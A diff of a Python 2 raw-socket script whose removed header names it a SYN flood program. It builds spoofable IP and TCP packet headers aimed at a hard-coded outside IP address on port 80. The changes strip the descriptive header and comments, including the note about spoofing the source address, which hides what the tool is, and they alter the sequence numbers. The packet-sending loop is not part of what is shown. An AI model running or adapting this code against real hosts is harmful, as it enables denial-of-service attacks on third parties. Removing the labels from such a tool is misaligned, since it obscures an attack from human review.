@@ -1,45 +1,30 @@
-'''
-    Syn flood program in python using raw sockets (Linux)
-    http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
-    Silver Moon (m00n.silv3r@gmail.com)
-'''
- 
-# some imports
+
 import socket, sys
 from struct import *
- 
-# checksum functions needed for calculation checksum
+
 def checksum(msg):
     s = 0
-    # loop taking 2 characters at a time
     for i in range(0, len(msg), 2):
         w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
         s = s + w
-     
-    s = (s>>16) + (s & 0xffff);
-    #s = s + (s >> 16);
-    #complement and mask to 4 byte short
+    s = (s>>16) + (s & 0xffff)
     s = ~s & 0xffff
-     
     return s
  
-#create a raw socket
+
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 except socket.error , msg:
     print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
     sys.exit()
- 
-# tell kernel not to put in headers, since we are providing it
+
 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
      
-# now start constructing the packet
 packet = '';
  
 source_ip = '192.168.199.126'
 dest_ip = '154.92.15.210' # or socket.gethostbyname('www.google.com')
- 
-# ip header fields
+
 ihl = 5
 version = 4
 tos = 0
@@ -49,7 +34,7 @@ frag_off = 0
 ttl = 255
 protocol = socket.IPPROTO_TCP
 check = 10  # python seems to correctly fill the checksum
-saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
+saddr = socket.inet_aton ( source_ip ) 
 daddr = socket.inet_aton ( dest_ip )
  
 ihl_version = (version << 4) + ihl
@@ -60,8 +45,8 @@ ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl,
 # tcp header fields
 source = 1234   # source port
 dest = 80   # destination port
-seq = 0
-ack_seq = 0
+seq = 7765
+ack_seq = 7756
 doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
 #tcp flags
 fin = 0
